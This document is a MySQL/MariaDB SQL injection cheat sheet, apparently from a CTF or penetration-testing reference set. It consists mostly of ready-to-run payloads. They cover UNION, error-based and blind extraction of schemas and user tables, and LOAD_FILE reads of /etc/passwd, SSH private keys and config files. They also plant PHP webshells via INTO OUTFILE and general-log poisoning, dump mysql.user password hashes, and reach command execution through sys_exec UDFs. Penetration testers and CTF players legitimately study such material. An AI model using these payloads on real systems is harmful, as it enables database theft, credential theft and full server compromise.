# MySQL / MariaDB — full exploitation reference

Everything MySQL-specific: fingerprint, enumeration, extraction,
file I/O, privilege checks, RCE paths, quirks. Cross-channel payload
shapes live in the channel files (union.md, boolean-blind.md,
time-blind.md, error-based.md, oob.md) — this file is what to put
INSIDE them once `@@version` says MySQL.

---

## 1. Fingerprint

```sql
@@version                          -- '8.0.36-0ubuntu0.22.04.1'
version()                          -- same
@@version_comment                  -- 'MySQL Community Server - GPL'
                                   --  'mariadb.org binary distribution'
system_user(), current_user(), user()
                                   -- 'appuser@localhost'
database()                         -- current schema
@@datadir, @@basedir, @@hostname
@@version_compile_os, @@version_compile_machine
```

MariaDB distinguishing tells:

```sql
@@version LIKE '%MariaDB%'         -- literal '5.5.5-10.5.21-MariaDB'
                                   -- note the 5.5.5- prefix (client compat)
tidb_version()                     -- TiDB-only function (exists on TiDB)
```

MySQL-only functions (exist on MySQL, error elsewhere):
`extractvalue`, `updatexml`, `gtid_subset`, `row_count()`,
`last_insert_id()`, `found_rows()`.

---

## 2. Information schema — complete map

```sql
-- databases
SELECT schema_name FROM information_schema.schemata;
group_concat(schema_name) FROM information_schema.schemata;

-- tables (current db)
SELECT table_name FROM information_schema.tables
  WHERE table_schema=database();
-- tables (named db, hex string literal to dodge quote filters)
SELECT table_name FROM information_schema.tables
  WHERE table_schema=0x6170706462;          -- 'appdb'

-- columns
SELECT column_name,column_type FROM information_schema.columns
  WHERE table_schema='appdb' AND table_name='users';
-- everything at once
group_concat(table_name,0x3a,column_name) FROM
  information_schema.columns WHERE table_schema=database();

-- all non-system schemas' tables
SELECT table_schema,table_name FROM information_schema.tables
  WHERE table_schema NOT IN
  ('mysql','information_schema','performance_schema','sys');

-- routines/views/triggers (often hide logic AND creds)
SELECT routine_name,routine_definition FROM information_schema.routines;
SELECT trigger_name,action_statement FROM information_schema.triggers;
SELECT table_name,view_definition FROM information_schema.views;
```

MySQL-only shortcuts:

```sql
SHOW DATABASES;                    -- needs stacked query
SHOW TABLES FROM appdb;
SHOW COLUMNS FROM users;
SHOW GRANTS FOR current_user();
```

information_schema equivalents for the unstacked path — always prefer
them inside UNION.

---

## 3. UNION extraction recipes

```sql
-- column count via ramp (detection.md)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- core identity one-shot
' UNION SELECT NULL,concat_ws(0x3a,user(),database(),@@version),NULL-- -

-- all schemas in one field
' UNION SELECT NULL,group_concat(schema_name),NULL
   FROM information_schema.schemata-- -

-- tables of current db
' UNION SELECT NULL,group_concat(table_name),NULL
   FROM information_schema.tables WHERE table_schema=database()-- -

-- columns of users
' UNION SELECT NULL,group_concat(column_name,0x3a,column_type),NULL
   FROM information_schema.columns WHERE table_name='users'
   AND table_schema=database()-- -

-- rows (two-col dump)
' UNION SELECT NULL,group_concat(concat_ws(0x3a,username,password)),NULL
   FROM users-- -

-- paged table listing (group_concat truncation workaround)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables
   WHERE table_schema=database() LIMIT 0,1-- -   -- then 1,1 / 2,1 ...
```

---

## 4. Error-based recipes

```sql
' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -
' AND updatexml(1,concat(0x7e,(SELECT @@datadir)),1)-- -
' AND gtid_subset(concat(0x7e,(SELECT @@version)),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT
   group_concat(table_name) FROM information_schema.tables),
   FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
' AND polygon((SELECT * FROM (SELECT * FROM
   (SELECT group_concat(table_name) FROM information_schema.tables
    WHERE table_schema=database())a)b)c)-- -
' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,user())))-- -
```

Details and length limits: `error-based.md`.

---

## 5. Blind recipes

```sql
-- boolean
' AND LENGTH(database())>6-- -
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables
   WHERE table_schema=database() LIMIT 0,1),1,1))>100-- -
' AND BINARY SUBSTRING((SELECT password FROM users LIMIT 1),1,1)>'5'-- -

-- bitwise (no > needed)
' AND ASCII(SUBSTRING(database(),1,1)) & 64-- -
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),2,1))>>3)&1-- -

-- time
' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(3),0)-- -
' AND IF((SELECT COUNT(*) FROM users WHERE username LIKE 'ad%')>0,
   SLEEP(4),0)-- -
' AND (SELECT CASE WHEN ASCII(SUBSTRING(user(),1,1))>100
   THEN SLEEP(3) ELSE 0 END)-- -
```

---

## 6. File read

`secure_file_priv` decides whether LOAD_FILE / OUTFILE work — check
it FIRST:

```sql
' UNION SELECT NULL,@@secure_file_priv,NULL-- -
-- value NULL       -> file ops DISABLED
-- value '/var/...' -> only that dir
-- value ''         -> unrestricted (best case)
' UNION SELECT NULL,@@global.secure_file_priv,NULL-- -
```

Reads:

```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\win.ini'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('\\\\YOUR.OOB\\x'),NULL-- -   -- OOB UNC
' UNION SELECT NULL,TO_BASE64(LOAD_FILE('/bin/sh')),NULL-- -
   -- base64 binary files; decode locally
' UNION SELECT NULL,HEX(LOAD_FILE('/root/.ssh/id_rsa')),NULL-- -
```

Common targets:

```text
/etc/passwd                       /root/.ssh/id_rsa
/var/www/html/index.php           /var/www/html/wp-config.php
/var/www/html/.env                /etc/mysql/my.cnf
/proc/self/environ                /proc/net/tcp (open ports)
/home/*/.bash_history             C:\Windows\System32\drivers\etc\hosts
C:\xampp\htdocs\config.php        C:\Users\*\Desktop\*.txt
```

LOAD_FILE returns NULL on missing file / no privilege — the UNION
row renders empty; distinguish "file absent" from "channel dead" by
first reading `/etc/hostname` or `win.ini` (almost always present).

---

## 7. File write — webshell paths

```sql
' UNION SELECT NULL,'<?php system($_GET["c"]); ?>',NULL
   INTO OUTFILE '/var/www/html/sh.php'-- -
' UNION SELECT 1,2,3,4 INTO DUMPFILE
   '/var/www/html/sh.php'-- -        -- binary-safe variant

-- write when webroot unknown — read config first:
' UNION SELECT NULL,LOAD_FILE('/etc/nginx/nginx.conf'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/etc/apache2/apache2.conf'),NULL-- -
-- look for DocumentRoot / root directives, then write there
```

INTO OUTFILE constraints:

- File must NOT already exist (won't overwrite).
- The MySQL service user needs write perms on the dir — web roots
  are often group-writable; try `/tmp/`, `/var/www/html/uploads/`,
  app asset dirs.
- `secure_file_priv=''` or matching the target dir.
- Windows: `INTO OUTFILE 'C:\\xampp\\htdocs\\sh.php'` — escape
  backslashes or use forward slashes (MySQL accepts `C:/xampp/...`).

Non-UNION writes (subquery context):

```sql
' ; SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE
   '/var/www/html/s.php'-- -            -- needs stacked (rare)
' AND (SELECT '<?php eval($_POST[x]);?>' INTO DUMPFILE
   '/tmp/a.php')-- -
```

---

## 8. Privilege & introspection

```sql
' UNION SELECT NULL,current_user(),NULL-- -
' UNION SELECT NULL,concat(user,0x3a,host),NULL FROM mysql.user-- -
' UNION SELECT NULL,group_concat(concat_ws(0x3a,user,host)),NULL
   FROM mysql.user-- -

-- privileges of current user
' UNION SELECT NULL,group_concat(privilege_type),NULL
   FROM information_schema.user_privileges-- -
' UNION SELECT NULL,super_priv,NULL FROM mysql.user
   WHERE user=substring_index(current_user(),'@',1)-- -
' UNION SELECT NULL,file_priv,NULL FROM mysql.user
   WHERE user=substring_index(current_user(),'@',1)-- -

-- password hashes (offline crack material — mysql.user!)
' UNION SELECT NULL,concat(user,0x3a,authentication_string),NULL
   FROM mysql.user-- -                -- 8.x column name
' UNION SELECT NULL,concat(user,0x3a,password),NULL
   FROM mysql.user-- -                -- 5.x column name

-- who is connected / running queries
' UNION SELECT NULL,group_concat(concat_ws(0x3a,user,host,command,
   info)),NULL FROM information_schema.processlist-- -
```

`information_schema.user_privileges` vs `mysql.user`: the first is
readable by any user (their own grants); `mysql.user` needs priv.

---

## 9. RCE paths (ordered by frequency)

1. **INTO OUTFILE webshell** — §7. Most common.
2. **UDF (User Defined Function) — sys_exec/sys_eval**

   ```sql
   -- needs: FILE priv + plugin_dir writeable + a udf .so/.dll
   ' UNION SELECT NULL,@@plugin_dir,NULL-- -
   SELECT * FROM mysql.func;                 -- existing UDFs?
   CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
   SELECT sys_exec('id > /tmp/out');
   ```

   Uploading the .so needs a file-write primitive (OUTFILE of hex
   bytes via `UNHEX()`), so this chains off §7.
3. **General log poisoning** (needs FILE + admin-ish priv, stacked):

   ```sql
   SET GLOBAL general_log='ON';
   SET GLOBAL general_log_file='/var/www/html/l.php';
   SELECT '<?php system($_GET["c"]); ?>';
   SET GLOBAL general_log='OFF';
   ```

4. **MySQL 8 component/`component_udf` + `INSTALL COMPONENT`** —
   rare, needs admin.
5. **Triggers/stored-proc injection** — only when you can stack
   DDL. Not common in CTF; skip unless the handout invites it.
6. **Webshell via existing writable dir + `..` in filename**
   when OUTFILE restricted to a dir inside webroot.

---

## 10. Quirks worth knowing

- `LIMIT x,y` inside UNION applies to the UNION — add parens:
  `(SELECT ... LIMIT 1)` to scope it.
- MySQL silently casts: `'abc'+1` = 1, `'a'='a'` true.
  `'a'||'b'` is OR not concat unless `PIPES_AS_CONCAT` — use
  `concat()`/`concat_ws()`.
- Comments: `#`, `-- ` (with space), `/**/` inline, `/*!50000 x */`
  executes `x` only on MySQL ≥ version — WAF gold, see waf-evasion.
- `REGEXP` exists → boolean probes without `>`:
  `SUBSTRING(x,1,1) REGEXP '^[a-f]'`.
- `JSON_EXTRACT`, `->>`, `->` paths — JSON columns searchable blind.
- `information_schema` is a VIEW schema — every probe hits it fresh;
  no caching weirdness, but heavy queries get logged in slow log.
- MariaDB extras: `SYS` schema, `sequence` engine
  (`SELECT * FROM seq_1_to_10` generates numbers — handy for
  ASCII brute force without extra tables).
- `HANDLER` statement — direct row reads bypassing some ACLs
  (stacked only).
- `CONV(HEX(v),16,10)` — whole-value numeric oracle (boolean-blind §5).
- `COMPRESS(v)`/`UNCOMPRESS` — shrink long blobs before hex-dump.

---

## 11. Second-order / stored tricks

- `information_schema` is not writable — store payloads in app
  tables, then trigger the consumer (report/export/email).
- `INTO OUTFILE` inside a stored value fires when the admin query
  runs it — classic CTF "register then admin export" chain.
- `mysql.general_log` table exists — if `log_output='TABLE'`, your
  queries land in mysql.general_log — readable via UNION:
  `SELECT argument FROM mysql.general_log` (priv needed).

---

## 12. Quick diagnosis table

| Need | Statement |
|---|---|
| who am I | `current_user()`, `user()` |
| where am I | `database()`, `@@datadir`, `@@hostname` |
| what can I touch | `information_schema.user_privileges`, `mysql.user` |
| read a file | `LOAD_FILE(path)` (priv + secure_file_priv) |
| write a file | `... INTO OUTFILE path` / `DUMPFILE` |
| dump tables | `information_schema.tables/.columns` |
| dump users+hashes | `mysql.user` |
| running queries | `information_schema.processlist` |
| sleep | `SLEEP(n)` / `BENCHMARK(n,SHA1('x'))` |
| error echo | `extractvalue`/`updatexml`/`gtid_subset`/`ST_*` |
| OOB | `LOAD_FILE('\\\\u.oob\\x')` (Windows) |
